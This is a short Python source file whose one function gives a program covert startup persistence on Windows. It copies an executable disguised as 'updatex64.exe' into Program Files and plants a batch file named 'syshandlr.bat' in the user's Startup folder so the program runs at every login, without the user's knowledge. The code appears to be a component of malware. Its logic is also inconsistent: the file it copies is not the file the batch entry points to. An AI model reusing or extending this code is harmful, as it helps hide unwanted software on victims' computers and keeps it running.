import os
import shutil
import sys
def start():
    if os.name != 'nt': #don't attempt to auto run at startup if not windows
        return
    else:
        user = os.getlogin()#Get the currently logged in user
        startupdir = r"C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" % (user) #Get the current user's startup directory
        selffile = 'updatex64.exe' #Name to save the exe as. 
        exedirec = r'C:\Program Files'#directory to write the exe to 
        startupbatdir = startupdir + '\syshandlr.bat'# name of the .bat file that will show up in the startup folder
        try:
            shutil.copy(selffile, exedirec)#Copy the exe to the exe directory
            f= open(startupbatdir,"w+")#Create the .bat in the startup directory
            fulldirec = exedirec + "\\" + os.path.basename(sys.argv[0])#Calculate the exact path of the exe by adding the exe directory to the file name.
            f.write(fulldirec)#write this into the bat so the bat runs the exe
            f.close()#close the writing code.

        except:
            failed = True#No implementation for this 'failed' variable yet, simply there to fill the space

